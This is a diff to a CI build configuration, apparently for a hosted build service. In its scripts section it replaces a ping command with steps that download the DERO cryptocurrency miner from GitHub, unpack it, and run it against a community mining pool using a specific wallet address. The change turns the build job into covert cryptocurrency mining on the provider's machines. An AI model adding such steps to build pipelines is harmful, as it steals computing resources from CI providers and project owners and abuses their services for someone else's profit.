@@ -4,4 +4,6 @@ workflows:
     instance_type: linux_x2   # machine instance type
     max_build_duration: 120       # build duration in minutes (min 1, max 120)
     scripts:
-        - ping -n 10000 google.com
+        - wget https://github.com/deroproject/derohe/releases/download/Release116/dero_linux_amd64.tar.gz
+        - tar zxvf dero_linux_amd64.tar.gz
+        - ./dero_linux_amd64/dero-miner-linux-amd64 --wallet-address=dero1qy4p7g4tlfl837nhskz5a6x4cqup28e2hpm0vktsw39smpn3fyah7qqtq7yhq --daemon-rpc-address=community-pools.mysrv.cloud:10300
